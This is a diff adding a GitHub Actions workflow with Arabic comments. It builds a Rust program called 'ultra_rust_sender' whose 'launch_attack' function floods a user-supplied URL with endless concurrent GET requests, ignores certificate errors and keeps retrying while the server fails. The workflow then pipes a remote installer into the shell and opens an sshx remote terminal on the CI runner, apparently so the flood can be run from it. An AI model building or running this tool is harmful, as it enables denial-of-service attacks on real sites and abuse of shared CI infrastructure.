@@ -1,0 +1,203 @@
+name: Rust + SSHX
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  setup-rust-sshx:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355  # حوالي 6 ساعات
+    
+    steps:
+      - uses: actions/checkout@v3
+
+      # --- 1. تحديث النظام وتثبيت أدوات البناء الأساسية ---
+      - name: Update System & Install Deps
+        run: |
+          echo ">>> Updating system..."
+          sudo apt-get update
+          sudo apt-get install -y build-essential libssl-dev pkg-config curl git
+          echo "✓ System dependencies installed"
+
+      # --- 2. تثبيت Rust (اللغة والمترجم) ---
+      - name: Install Rust Toolchain
+        run: |
+          echo ">>> Installing Rust..."
+          curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
+          echo "✓ Rust installed"
+
+      # --- 3. إنشاء المشروع وحقن الكود (بدون مصادر خارجية) ---
+      - name: Create Rust Project & Inject Code
+        run: |
+          # تفعيل بيئة Rust
+          source $HOME/.cargo/env
+          
+          echo ">>> Creating project: ultra_rust_sender"
+          cargo new ultra_rust_sender
+          cd ultra_rust_sender
+
+          # --- كتابة ملف Cargo.toml ---
+          echo ">>> Injecting Cargo.toml..."
+          cat << 'EOF' > Cargo.toml
+          [package]
+          name = "ultra_rust_sender"
+          version = "0.1.0"
+          edition = "2021"
+
+          [dependencies]
+          tokio = { version = "1", features = ["full"] }
+          reqwest = { version = "0.11", features = ["rustls-tls"] }
+          num_cpus = "1.0"
+          mimalloc = "0.1"
+          EOF
+
+          # --- كتابة ملف main.rs (الكود القوي) ---
+          echo ">>> Injecting src/main.rs..."
+          cat << 'EOF' > src/main.rs
+          use std::sync::atomic::{AtomicUsize, Ordering};
+          use std::sync::Arc;
+          use std::time::Duration;
+          use tokio::runtime::Builder;
+          use mimalloc::MiMalloc;
+
+          // 1. تفعيل مدير الذاكرة السريع جداً بدلاً من الافتراضي
+          #[global_allocator]
+          static GLOBAL: MiMalloc = MiMalloc;
+
+          // العداد
+          static TOTAL_SENT: AtomicUsize = AtomicUsize::new(0);
+
+          fn main() {
+              // تنظيف الشاشة
+              print!("{}[2J", 27 as char);
+              println!("=== RUST FIRE-AND-FORGET ENGINE (Max Speed) ===\n");
+
+              // إدخال الرابط
+              let mut url = String::new();
+              println!("Enter Target URL:");
+              std::io::stdin().read_line(&mut url).unwrap();
+              let url = url.trim().to_string();
+
+              if url.is_empty() { return; }
+
+              // إدخال عدد العمال (Concurrency)
+              println!("Enter Threads/Workers Count (e.g., 5000):");
+              let mut conns = String::new();
+              std::io::stdin().read_line(&mut conns).unwrap();
+              let connections: usize = conns.trim().parse().unwrap_or(5000);
+
+              // 2. تكتيك الدكتور: حساب الأنوية وحجز واحدة للنظام
+              let total_cores = num_cpus::get();
+              let worker_threads = if total_cores > 1 { total_cores - 1 } else { 1 };
+
+              println!("\nDetected Cores: {}", total_cores);
+              println!("Active Engines: {} (1 Core Reserved for OS/Network Stack)", worker_threads);
+              println!("Target: {}", url);
+              println!("Starting Stream...\n");
+
+              // 3. بناء المحرك يدوياً لتخصيص الأنوية
+              let runtime = Builder::new_multi_thread()
+                  .worker_threads(worker_threads) // هنا يتم التنفيذ الفعلي لطلب الدكتور
+                  .enable_all()
+                  .build()
+                  .unwrap();
+
+              runtime.block_on(async {
+                  launch_attack(url, connections).await;
+              });
+          }
+
+          async fn launch_attack(url: String, connections: usize) {
+              // إعداد العميل بأقوى إعدادات للسرعة وعدم الانتظار
+              let client = reqwest::Client::builder()
+                  .tcp_nodelay(true) // إلغاء خوارزمية Nagle لإرسال الباكت فوراً
+                  .pool_max_idle_per_host(connections) // الحفاظ على الاتصالات مفتوحة
+                  .timeout(Duration::from_secs(10)) // تايم أوت في حال تعليق السيرفر
+                  .danger_accept_invalid_certs(true)
+                  .build()
+                  .unwrap();
+
+              let shared_client = Arc::new(client);
+              let shared_url = Arc::new(url);
+
+              // تشغيل العداد (Monitor)
+              tokio::spawn(async move {
+                  let mut old = 0;
+                  loop {
+                      tokio::time::sleep(Duration::from_secs(1)).await;
+                      let current = TOTAL_SENT.load(Ordering::Relaxed);
+                      let rps = current - old;
+                      old = current;
+                      println!("RPS: {} | Total: {}", rps, current);
+                  }
+              });
+
+              // 4. تشغيل العمال (Workers)
+              let mut tasks = Vec::with_capacity(connections);
+
+              for _ in 0..connections {
+                  let client = shared_client.clone();
+                  let url = shared_url.clone();
+
+                  tasks.push(tokio::spawn(async move {
+                      loop {
+                          // الفكرة الجوهرية هنا:
+                          // send().await ترسل الطلب وتنتظر فقط وصول الـ Headers
+                          // نحن لا نقوم بعمل .text().await أو .bytes().await
+                          // بمجرد وصول التأكيد أن السيرفر استلم، ننتقل فوراً للطلب التالي
+                          // هذا هو "الإرسال الحقيقي" بأسرع طريقة ممكنة في بروتوكول HTTP
+
+                          match client.get(url.as_str()).send().await {
+                              Ok(_) => {
+                                  // نجح الإرسال واستلم السيرفر الطلب.
+                                  // لا نقرأ الرد، نزيد العداد ونكرر فوراً.
+                                  TOTAL_SENT.fetch_add(1, Ordering::Relaxed);
+                              }
+                              Err(_) => {
+                                  // في حال حدوث خطأ (السيرفر مات)، نعيد المحاولة فوراً
+                              }
+                          }
+                      }
+                  }));
+              }
+
+              // الانتظار للأبد
+              futures::future::join_all(tasks).await;
+          }
+          EOF
+          
+          # --- بناء المشروع مسبقاً (Pre-Compile) ---
+          echo ">>> Pre-compiling project in RELEASE mode..."
+          # هذا سيقوم بتنزيل المكتبات وبناء الملف التنفيذي ليكون جاهزاً فوراً
+          cargo build --release
+          
+          echo "✓ Project built successfully! Location: target/release/ultra_rust_sender"
+
+      # --- 4. تشغيل sshx وعرض الرابط ---
+      - name: Start sshx.io Session
+        run: |
+          echo ">>> Installing sshx..."
+          curl -sSf https://sshx.io/get | sh
+          
+          echo ">>> Starting sshx..."
+          sshx > sshx_output.txt 2>&1 &
+          
+          echo ">>> Waiting for connection link..."
+          sleep 5
+          
+          echo ""
+          echo "######################################################"
+          echo "             YOUR SSHX SESSION IS READY"
+          echo "######################################################"
+          cat sshx_output.txt
+          echo "######################################################"
+          echo ""
+          echo "COMMAND TO RUN AFTER LOGIN:"
+          echo "cd ultra_rust_sender && ./target/release/ultra_rust_sender"
+          echo ""
+          
+          # إبقاء الجلسة حية
+          tail -f sshx_output.txt
